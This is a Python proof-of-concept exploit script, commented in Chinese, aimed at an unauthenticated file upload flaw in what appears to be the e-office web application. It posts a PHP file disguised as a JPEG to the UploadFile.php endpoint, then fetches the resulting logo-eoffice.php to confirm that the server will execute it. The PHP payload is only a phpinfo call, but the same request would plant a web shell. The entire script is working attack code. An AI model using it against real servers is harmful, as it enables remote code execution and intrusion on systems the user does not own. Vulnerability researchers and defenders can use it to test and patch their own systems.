import requests
import argparse
from faker import Faker

fake = Faker()
# 创建命令行参数解析器
parser = argparse.ArgumentParser(description='发送带有指定URL的POST请求。存在问题的路径为/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId=，参数是Filedata',formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('-u', '--url', type=str, help='输入目标url发送post请求')

args = parser.parse_args()

if args.url:
    if args.url.endswith('/'):
        url = args.url[:-1] + "/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId="  # 移除末尾的斜杠
        url1 = args.url[:-1] + "/images/logo/logo-eoffice.php"
    else:
        url = args.url + "/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId="
        url1 = args.url + "/images/logo/logo-eoffice.php"
else:
    print("Please provide a valid URL using -u or --url argument.")
    exit()

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36',
    'Accept-Encoding': 'gzip, deflate',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Connection': 'close',
    'Accept-Language': 'zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6',
    'Cookie': 'LOGIN_LANG=cn; PHPSESSID=0acfd0a2a7858aa1b4110eca1404d348'
}

files = {
    'Filedata': ('test.php', '<?php phpinfo(111);?>', 'image/jpeg')
}

response = requests.post(url, headers=headers, files=files)
response1 = requests.get(url1)
if response1.status_code == 200:
    print("目标url："+ url + '\n' +"可能存在该漏洞" + '\n' + "上传路径为：" + url1 )
else:
    print("目标url："+ url + '\n' +"不存在该漏洞")
# print(response.text)


